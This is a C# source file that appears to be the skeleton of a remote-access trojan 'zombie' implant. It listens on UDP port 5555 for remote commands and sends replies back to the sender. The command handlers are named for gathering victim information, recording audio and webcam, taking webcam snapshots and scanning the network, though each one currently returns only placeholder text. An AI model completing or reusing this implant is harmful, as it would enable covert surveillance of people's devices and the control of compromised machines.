using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Sessions
{
    public class Server
    {
        UdpClient server = new UdpClient(5555);
        private string lhost, message;
        private int lport;

        public string Message { get => message; set => message = value; }

        // Default Builder (With Launch Listenner Thread);
        public Server()
        {
            Thread server_thread = new Thread(Listen);
            server_thread.Start();
        }

        /* ################################### < SECTION GESTION CLIENT / SERVER > ########################################## */

        /// <summary>
        /// 1) Create server with port listener.
        /// 2) Create infinite loop (listen).
        /// 3) Create IPEndPoint => receive data from distant socket.
        /// 4) data = receive data
        /// 5) storage infos socket client
        /// </summary>
        private void Listen()
        {
            while (true)
            {
                IPEndPoint clientSocket = null;

                byte[] data = server.Receive(ref clientSocket);

                lhost = clientSocket.Address.ToString();
                lport = clientSocket.Port;

                string test = "Données reçues en provenance de " + clientSocket.Address + " : " + clientSocket.Port;

                message = Encoding.Default.GetString(data);

                string disencapsulation = "CONTENU DU MESSAGE : " + message;

                action(message);
            }
        }

        //send data to Distant Socket Server 
        private void client(string message)
        {
            //Sérialisation of message into byte array
            byte[] msg = Encoding.Default.GetBytes(message);

            UdpClient udpClient = new UdpClient();

            //Send UDP message
            udpClient.Send(msg, msg.Length, lhost, lport);

            udpClient.Close();
        }


        /* ######################################## < SECTION GESTION ACTIONS > ############################################### */

        private void action(string msg)
        {
            switch (msg)
            {
                case "infos_zombie":
                    client("Recherche d'information en cours ....");
                    msg = " Recherche d'infos";
                    client(msg);
                    break;

                case "audio_reccord":
                    msg = "123456789";
                    client(msg);
                    break;

                case "webcam_reccord":
                    msg = "123456789";
                    client(msg);
                    break;

                case "webcam_snap":
                    msg = "123456789";
                    client(msg);
                    break;

                case "scan_network":
                    msg = "123456789";
                    client(msg);
                    break;
            }
        }

        public void Send(string data) { client(data); }
    }
}